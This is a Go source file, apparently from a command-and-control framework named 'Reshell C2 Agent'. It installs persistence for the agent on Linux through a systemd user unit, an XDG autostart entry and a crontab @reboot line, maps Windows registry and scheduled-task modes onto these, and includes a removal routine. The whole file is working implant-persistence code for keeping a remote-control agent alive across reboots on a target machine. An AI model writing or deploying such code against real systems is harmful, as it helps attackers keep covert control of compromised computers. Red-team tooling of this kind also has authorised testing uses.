//go:build linux

package linuxagent

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"strings"
)

const (
	autostartUnitName = "reshell-c2-agent.service"
	crontabMarkerLine = "# reshell-c2-agent"
)

// autostartSet 将 Web/Windows 命名映射为 Linux 实现；exePath 须为当前 agent 可执行文件绝对路径。
func autostartSet(mode, exePath string) (string, bool) {
	exe := filepath.Clean(exePath)
	if abs, err := filepath.Abs(exe); err == nil {
		exe = abs
	}
	switch strings.ToLower(strings.TrimSpace(mode)) {
	case "systemd_user", "linux_systemd":
		return autostartSystemdUser(exe)
	case "linux_xdg", "startup_folder":
		return autostartDesktopEntry(exe)
	case "linux_crontab", "crontab":
		return autostartCrontabReboot(exe)
	case "registry", "registry_hkcu", "scheduled_task":
		// 面板 Windows 默认项：优先 systemd --user，失败则 crontab（无图形会话时更稳）
		if msg, ok := autostartSystemdUser(exe); ok {
			return msg, true
		}
		return autostartCrontabReboot(exe)
	case "registry_hklm", "registry_machine":
		return "Linux 无 HKLM；请选「systemd 用户单元」「XDG 会话自启」或「crontab @reboot」", false
	case "startup_folder_all_users":
		return "Linux 写 /etc/xdg/autostart 需 root；请用 systemd（系统级）或当前用户的 XDG/systemd/cron", false
	default:
		return autostartSystemdUser(exe)
	}
}

func autostartSystemdUser(exe string) (string, bool) {
	dir, err := os.UserConfigDir()
	if err != nil {
		return err.Error(), false
	}
	unitDir := filepath.Join(dir, "systemd", "user")
	if err := os.MkdirAll(unitDir, 0755); err != nil {
		return err.Error(), false
	}
	unitPath := filepath.Join(unitDir, autostartUnitName)
	// 路径含空格等时用引号，避免 unit 解析失败
	execArg := strconv.Quote(exe)
	contents := fmt.Sprintf(`[Unit]
Description=Reshell C2 Agent
After=network-online.target

[Service]
Type=simple
ExecStart=%s
Restart=on-failure

[Install]
WantedBy=default.target
`, execArg)
	if err := os.WriteFile(unitPath, []byte(contents), 0644); err != nil {
		return err.Error(), false
	}
	_ = exec.Command("systemctl", "--user", "daemon-reload").Run()
	out, err := exec.Command("systemctl", "--user", "enable", "--now", autostartUnitName).CombinedOutput()
	msg := strings.TrimSpace(string(out))
	if err != nil {
		hint := "（若无图形登录会话，可试「crontab @reboot」；headless 可执行 loginctl enable-linger $USER）"
		return "systemctl --user: " + msg + " (" + err.Error() + ") " + hint, false
	}
	return "OK | systemd_user | " + msg, true
}

func autostartDesktopEntry(exe string) (string, bool) {
	dir, err := os.UserConfigDir()
	if err != nil {
		return err.Error(), false
	}
	ad := filepath.Join(dir, "autostart")
	if err := os.MkdirAll(ad, 0755); err != nil {
		return err.Error(), false
	}
	p := filepath.Join(ad, "reshell-c2-agent.desktop")
	// Desktop Exec 对路径中的空格需转义或用引号
	execLine := strings.ReplaceAll(exe, ` `, `\ `)
	body := fmt.Sprintf(`[Desktop Entry]
Type=Application
Name=Reshell C2 Agent
Exec=%s
Hidden=false
NoDisplay=false
X-GNOME-Autostart-enabled=true
`, execLine)
	if err := os.WriteFile(p, []byte(body), 0644); err != nil {
		return err.Error(), false
	}
	return "OK | linux_xdg | " + p + "（需用户图形会话登录后才会启动）", true
}

func quoteCronPath(path string) string {
	return `'` + strings.ReplaceAll(path, `'`, `'"'"'`) + `'`
}

func autostartCrontabReboot(exe string) (string, bool) {
	line := fmt.Sprintf("@reboot %s %s", quoteCronPath(exe), crontabMarkerLine)
	out, err := exec.Command("crontab", "-l").CombinedOutput()
	existing := string(out)
	if err != nil {
		low := strings.ToLower(existing + err.Error())
		if strings.Contains(low, "no crontab") {
			existing = ""
		} else if !strings.Contains(existing, crontabMarkerLine) {
			return "crontab -l: " + strings.TrimSpace(existing) + " (" + err.Error() + ")", false
		}
	}
	lines := strings.Split(strings.TrimSpace(existing), "\n")
	for _, ln := range lines {
		if strings.Contains(ln, crontabMarkerLine) {
			return "OK | linux_crontab | 已存在 @reboot 行，未重复添加", true
		}
	}
	var b strings.Builder
	if strings.TrimSpace(existing) != "" {
		b.WriteString(strings.TrimRight(existing, "\n"))
		b.WriteString("\n")
	}
	b.WriteString(line)
	b.WriteString("\n")
	cmd := exec.Command("crontab", "-")
	cmd.Stdin = strings.NewReader(b.String())
	out2, err2 := cmd.CombinedOutput()
	if err2 != nil {
		return "crontab install: " + strings.TrimSpace(string(out2)) + " (" + err2.Error() + ")", false
	}
	return "OK | linux_crontab | 已写入当前用户 crontab（@reboot）", true
}

func autostartRemoveAll(_ string) string {
	var b strings.Builder
	_ = exec.Command("systemctl", "--user", "disable", "--now", autostartUnitName).Run()
	_ = exec.Command("systemctl", "--user", "daemon-reload").Run()
	b.WriteString("[systemd_user] disable attempted\n")

	if dir, err := os.UserConfigDir(); err == nil {
		_ = os.Remove(filepath.Join(dir, "systemd", "user", autostartUnitName))
		_ = os.Remove(filepath.Join(dir, "autostart", "reshell-c2-agent.desktop"))
	}
	b.WriteString("[unit+desktop] remove attempted\n")

	out, err := exec.Command("crontab", "-l").CombinedOutput()
	s := string(out)
	if err != nil {
		low := strings.ToLower(s + err.Error())
		if strings.Contains(low, "no crontab") {
			b.WriteString("[crontab] none\n")
			return b.String()
		}
		b.WriteString("[crontab] list: " + strings.TrimSpace(s) + " — " + err.Error() + "\n")
		return b.String()
	}
	var kept []string
	for _, ln := range strings.Split(s, "\n") {
		if strings.TrimSpace(ln) == "" {
			continue
		}
		if strings.Contains(ln, crontabMarkerLine) {
			continue
		}
		kept = append(kept, ln)
	}
	newCr := strings.Join(kept, "\n")
	if strings.Contains(s, crontabMarkerLine) {
		cmd := exec.Command("crontab", "-")
		if newCr == "" {
			cmd.Stdin = strings.NewReader("")
		} else {
			cmd.Stdin = strings.NewReader(newCr + "\n")
		}
		_, e2 := cmd.CombinedOutput()
		if e2 != nil {
			b.WriteString("[crontab] rewrite failed: " + e2.Error() + "\n")
		} else {
			b.WriteString("[crontab] removed reshell line\n")
		}
	}
	return b.String()
}
